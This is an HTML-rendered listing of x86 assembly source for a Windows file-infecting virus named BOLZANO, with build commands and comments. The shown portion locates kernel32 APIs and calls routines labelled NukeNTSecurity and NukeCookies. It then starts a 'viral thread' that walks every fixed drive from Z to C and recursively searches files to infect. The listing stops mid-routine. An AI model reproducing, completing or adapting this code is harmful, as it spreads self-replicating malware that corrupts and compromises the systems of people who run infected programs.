<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>BOLZANO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;          ---------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                              --- BOLZANO ---</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;          ---------------------------------------------------------   </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; TASM       /ml /zi BOLZANO</span><span class="sc0">
</span><span class="sc1">; TLINK32  -aa -r -v BOLZANO,,,\TASM\LIB\IMPORT32.LIB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">


</span><span class="sc10">RADIX</span><span class="sc0">        </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc9">ASSUME</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">HOST</span><span class="sc0">


</span><span class="sc5">HOST</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0">      </span><span class="sc12">'CODE'</span><span class="sc0">


             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc9">EXTRN</span><span class="sc0">        </span><span class="sc5">Beep</span><span class="sc0">                                   </span><span class="sc1">; at least one importation</span><span class="sc0">
                                                    </span><span class="sc1">; is necessary to get a</span><span class="sc0">
                                                    </span><span class="sc1">; reloc section</span><span class="sc0">
</span><span class="sc5">HOST</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc9">ASSUME</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">VIRUS</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">SEGMENT</span><span class="sc0">      </span><span class="sc12">'DATA'</span><span class="sc0">


</span><span class="sc5">X</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">


</span><span class="sc5">VS</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">68</span><span class="sc0">                        </span><span class="sc1">; save host EntryPoint</span><span class="sc0">
</span><span class="sc5">EntryPoint</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">401000h</span><span class="sc0">

             </span><span class="sc6">pushad</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetEIP</span><span class="sc0">

</span><span class="sc5">OS_Test</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; kernel32 return address</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80000000</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Win9x</span><span class="sc0">

</span><span class="sc5">WinNT</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WNT_GPA_Key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">77F00000</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Find_GPA</span><span class="sc0">

</span><span class="sc5">Win9x</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">W9x_GPA_Key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0BFF70000</span><span class="sc0">

</span><span class="sc5">Find_GPA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">K32_Base</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40000</span><span class="sc0">                 </span><span class="sc1">; GPA search depth</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">ScanKernel32</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Found</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitVS</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanKernel32</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
                                               
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_API</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">GetAddresses</span><span class="sc4">:</span><span class="sc0">                                                   

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">K32_Base</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">                  </span><span class="sc1">; edi points to GetProcAddress</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitVS</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">NextFunction</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFunction</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetAddresses</span><span class="sc0">

</span><span class="sc5">Initialize</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Buffer1 Address</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Buffer2 Address</span><span class="sc0">


</span><span class="sc1">; these 2 functions make this virus quite useful :)</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NukeNTSecurity</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NukeCookies</span><span class="sc0">


</span><span class="sc1">; now go on with the infection</span><span class="sc0">

             
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetLocalTime</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; current month</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; = self-infection mask</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadID</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">   </span><span class="sc1">; lpThreadID</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                    
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; dwCreationFlags</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">?</span><span class="sc0">                          </span><span class="sc1">; lpParameter</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reproduce</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">  </span><span class="sc1">; lpStartAddress</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                   
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                       
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; dwStackSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateThread</span><span class="sc0">               </span><span class="sc1">; launch viral thread</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileTest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FT_Address</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; hook host thread</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">BackToKernel</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; kernel32 return address</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KillThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0"> </span><span class="sc1">; so that the viral</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; thread will terminate</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; at the same time as</span><span class="sc0">
                                                     </span><span class="sc1">; the host program</span><span class="sc0">
</span><span class="sc5">ExitVS</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">popad</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">KillThread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C6</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
</span><span class="sc5">FT_Address</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">                          </span><span class="sc1">; stop search</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C3</span><span class="sc0">                        </span><span class="sc1">; with a ret</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">BackToKernel</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; the viral thread starts here</span><span class="sc0">


</span><span class="sc5">Reproduce</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; the Win9x kernel32 needs</span><span class="sc0">
                                                  </span><span class="sc1">; a correct value in ebp</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetEIP</span><span class="sc0">                  </span><span class="sc1">; when the thread terminates</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetCurrentThread</span><span class="sc0">        </span><span class="sc1">; get our viral thread handle</span><span class="sc0">
                                                  </span><span class="sc1">; in eax (usually -2)</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">6A</span><span class="sc0">
</span><span class="sc5">ThreadSpeed</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetThreadPriority</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">104</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">InitialDisk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                  
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectDisk</span><span class="sc0">              </span><span class="sc1">; first infected the disk</span><span class="sc0">
                                                  </span><span class="sc1">; where the virus started</span><span class="sc0">

</span><span class="sc1">; --------------</span><span class="sc0">

</span><span class="sc1">;            pop          ebp</span><span class="sc0">
</span><span class="sc1">;            ret                                  ; only for debug</span><span class="sc0">

</span><span class="sc1">; --------------</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">ScanDisks</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; then scan from Z to C</span><span class="sc0">
                                                  
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3C</span><span class="sc0">                      </span><span class="sc1">; cmp al,InitialDisk</span><span class="sc0">
</span><span class="sc5">InitialDisk</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; don't want to infect the</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AlreadyDone</span><span class="sc0">       </span><span class="sc1">; same disk twice</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectDisk</span><span class="sc0">

</span><span class="sc5">AlreadyDone</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">
             </span><span class="sc6">jnc</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanDisks</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectDisk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">005C3A3F</span><span class="sc0">            </span><span class="sc1">; '?:\',0</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetDriveTypeA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                  </span><span class="sc1">; no drive</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                  </span><span class="sc1">; floppy disk</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">                  </span><span class="sc1">; cd-rom</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartSearch</span><span class="sc0">

</span><span class="sc5">SkipDisk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">StartSearch</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; recursive search routine</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">CurDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">002A2E2A</span><span class="sc0">  </span><span class="sc1">; '*.*'</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AccessOk</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AccessOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">FileTest</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

